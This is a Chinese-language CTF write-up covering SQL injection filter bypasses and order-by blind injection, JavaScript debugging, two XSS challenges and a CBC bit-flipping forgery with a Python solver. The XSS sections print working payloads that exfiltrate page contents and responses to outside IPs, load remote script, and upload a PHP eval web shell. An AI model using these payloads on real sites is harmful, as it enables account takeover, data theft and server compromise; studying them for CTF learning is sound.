##simplesqli
key:union 查询判断了多于一列的内容就不返回内容
%00%0c%0b等等字符都会被删除。直接插入关键词就绕过了。。。。
/index.php?id=1 and substr((sel%00ect 1),1)这种语句跑一下就知道有没有replace了。。


##Temmo's Tiny Shope
key: 脑洞+orderby注入
这道题其实应该很简单的。。队友都说了无账号登录得到hint。。
(结果听说是条件竞争？看看大佬们的wp)
OK! Now I will give some hint: you can get flag by use `select flag from ce63e444b0d049e9c899c9a0336b3c59`
然后能够影响数据库的就只有orderby这个参数。
search 页面返回的是已买的东西的查询，所以只要通过不同的order就可以获得布尔值
当然like区分不了大小写，不过相关函数好像都被禁了。估计全是小写或者全是大写就行了。
if(condition, name, price)盲注即可
like枚举不行。有长度限制。。。不过用%flag%这种形式也可以枚举,不过就怕就重复的pattern
substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name)
flag{r4ce_c0nditi0n_i5_excited}


##Kog
key: js调试
这种题就是正确输入和错误输入开两个窗口一起调。然后F10一步一步看变量变化就好。
感觉越调越熟练了，有空了可以再来调一下。
找到 第一个地方 if(!$13)把$13改成true， 第二个地方if((label|0)==12)直接改成if(0)
调好了还卡了一下。不知道怎么注入。结果是直接js代码里面写上
window.location.href='http://202.120.7.213:11181/api.php?id='+args["id"]+'&hash='+ar[0]+'&time='+ar[1]; 就行了
后面没有过滤了，直接union查询得到flag


##Complicated XSS
key:注意一下xss过去的cookie要转义一下 <\/script>
+ -> %2b
" -> %22
' -> %27等等
这道题蛋疼的地方就是cookie会自动帮你转码。payload就不用转码了。。。
第二个坑点是admin.government.vip:8000的页面是用php渲染的，所以必须用onload，不然的话得到的html是渲染前的页面
第三个地方是path必须设置成/,domain设置成government.vip，admin浏览payload的时候是在/data/目录
第四个是window.xhr没了，怎么上传文件。

第一个payload：
<script>
document.cookie='username=<script>window.onload=function(){location.href="//119.29.109.138/"+document.body.innerHTML}<\/script>;domain=government.vip;Path=/';
location.href='//admin.government.vip:8000';
</script>

得到页面
<h1>Hello <script>window.onload=function(){location.href="//119.29.109.138/" document.body.innerHTML}</script></h1>
<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></p>
<p><input type="submit" value="upload">
</p></form> 

因为window.xhr被delete了，所以要想办法绕过。
看了几个大佬的wp。都是用iframe标签绕过就行
bendawang大佬的:
iframe onload=eval(String.fromCharCode(....))
中间是下面代码转码
var bdw=document.createElement("script");bdw.src="http://vps/evil.js";document.head.appendChild(bdw);
不过eval函数被删了，这里用iframe的this.contentWindow得到一个没有被删除eval的window对象，然后执行eval
melody大佬使用两个iframe，通过另外一个iframe /login里面的xhr来上传，本质上也是获得一个没有被删除函数的window对象
evil.js执行上传，这里用的是jquery。xhr的也贴一下备忘
jquery：
var t=document.getElementsByTagName('script')[0];
var ss=document.createElement('script');
ss.src='http://government.vip/static/jquery.min.js';
document.head.insertBefore(ss,t);
var body = "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"233\"\r\n" +
  "\r\n" +
  "eyJzY3JlZW5faGVpZ2h0Ijo4MjYsInNjcmVlbl93aWR0aCI6MTQ0MH0\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"source_flag\"\r\n" +
  "\r\n" +
  "0\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n" +
  "Content-Type: image/png\r\n" +
  "\r\n" +
  "GIF89a\x3c?php eval($_REQUEST[A]);?\x3e\x3c/script\x3e\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES--\r\n";
setTimeout('makeRequest()', 1000);//加载jquery
function makeRequest(){
	var settings={
		type:'POST',
		url:"http://admin.government.vip:8000/upload",
		data:body,
		success: function(data, textStatus){
			$.get('http://vps:12345/?abc=aaa+'+data);
		},
		headers:{
			"Access-Control-Allow-Headers":"X-Requested-With",
            "Content-Type": "multipart/form-data; boundary=---------------------------312061946619381",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8"
		}
	};
	$.ajax(settings);
}
服务器监听12345端口,ajax不能跨域，所以不能写入日志。

xhr。。第一次见，用的blob对象执行send()
function submitRequest()
      {
        window.XMLHttpRequest = window.top.frames[1].XMLHttpRequest; // 重新定义 window.XMLHttpRequest，继承另一个 iframe 的 window.XMLHttpRequest.
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://admin.government.vip:8000/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
        xhr.withCredentials = "true";
        var body = "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"test2.txt\"\r\n" +
          "Content-Type: text/plain\r\n" +
          "\r\n" +
          "test3\r\n" +
          "-----------------------------256672629917035--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                location.href="http://ip:port/"+escape(xhr.responseText);//把上传文件后的response给发回来。
            }
        }
        xhr.send(new Blob([aBody]));
}
submitRequest();

##simple xss
KEY:chrome解析\为/, 。可以代替.，link标签可以不闭合执行，script标签之类的都必须要闭合
? > : . / 被禁了
如key,chrome的特性
因为要访问flag.php，所以必定要执行代码。禁了这么多关键词，肯定要外部引入。所以考虑script或者link，embed之类的
link标签只有在chrome才能执行stylesheet以外的rel参数
因为这个网站是https.所以vps也必须是https（//的原因）
贴个别人的wp,我的ssl可能是假的。run.php连访问都没有。。

<link rel=prefetch href=\\61dclub。com\x
<link rel=import href=\\xss。lt

##Integrity
key:CBC翻转+CBC加密互不干涉可以随意去掉加密后的块改变明文内容
#!/usr/bin/python -u

from Crypto.Cipher import AES
from hashlib import md5
from Crypto import Random
from signal import alarm

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class Scheme:
    def __init__(self,key):
        self.key = key

    def encrypt(self,raw):
        raw = pad(raw)
        raw = md5(raw).digest() + raw

        iv = Random.new().read(BS)
        cipher = AES.new(self.key,AES.MODE_CBC,iv)

        return ( iv + cipher.encrypt(raw) ).encode("hex")

    def decrypt(self,enc):
        enc = enc.decode("hex")

        iv = enc[:BS] ##前16位
        enc = enc[BS:] ##之后

        cipher = AES.new(self.key,AES.MODE_CBC,iv)
        blob = cipher.decrypt(enc)

        checksum = blob[:BS]
        data = blob[BS:]

        if md5(data).digest() == checksum:
            return unpad(data)
        else:
            return

key = Random.new().read(BS)
scheme = Scheme(key)

flag = open("flag",'r').readline()
alarm(30)

print "Welcome to 0CTF encryption service!"
while True:
    print "Please [r]egister or [l]ogin"
    cmd = raw_input()

    if not cmd:
        break

    if cmd[0]=='r' :
        name = raw_input().strip()

        if(len(name) > 32):
            print "username too long!"
            break
        if pad(name) == pad("admin"):
            print "You cannot use this name!"
            break
        else:
            print "Here is your secret:"
            print scheme.encrypt(name)


    elif cmd[0]=='l':
        data = raw_input().strip()
        name = scheme.decrypt(data)

        if name == "admin":
            print "Welcome admin!"
            print flag
        else:
            print "Welcome %s!" % name
    else:
        print "Unknown cmd!"
        break

题目源码如上
得到的
095a646712924d51a335baff2a5349ed
9872bdc79222f3580782da559ae7aba3
584baac5ddd60c2dd1136e63fa15c030
d0be37f9c90832aa902245ec8ffbfd10
这样一段加密，前32是iv,后面是注册的内容的pad后的MD5+pad的内容
考虑CBC翻转，CBC翻转的原理是
P[I] = Decrypt(C[I])^C[i-1]
i=1的时候c[i-1]=iv
所以一般情况下cbc翻转只能控制一段decrypt出来的明文
如果注册admis，然后想把admis转成admin的话，那就要翻转第二段密文的s为n，然后翻转第一段的md5为pad(admin)的MD5，这是不可能的
在这里看到每一段密文都是相互没有依赖关系的（cbc加密）所以注册一个
raw=pad(admin)+xxx
这样的账号
得到的密文就是

md5(pad(raw))+pad(admin)+(xxx+padcontent)的加密
     第一段               第二段          第三段

拿上面的密文来说，正好对应密文后面三段
所以login的时候只要把第三段去掉，decrypt出来的内容就是
md5(pad(raw)) + pad(admin)了，后面的xxx就没有了
然后就很简单了。把iv翻转一下让明文md5(pad(raw))变成md5(pad(admin))就行了
附上简单的代码

# coding=utf-8
# python 2.7

from hashlib import md5
N=16
pad = lambda s:s+(N-len(s)%N)*chr(N-len(s)%N)

input = '095a646712924d51a335baff2a5349ed9872bdc79222f3580782da559ae7aba3584baac5ddd60c2dd1136e63fa15c030d0be37f9c90832aa902245ec8ffbfd10'
aim = md5(pad('admin')).digest()
iv = input.decode('hex')[:16]
iv = list(iv)
origin_md5 = md5(pad(pad('admin')+'xpo')).digest()
answer = input.decode('hex')[32:48]

for i in range(16):
    iv[i] = chr(ord(origin_md5[i])^ord(aim[i])^ord(iv[i]))
output = (''.join(iv)).encode('hex') + input[32:96]
print output
 
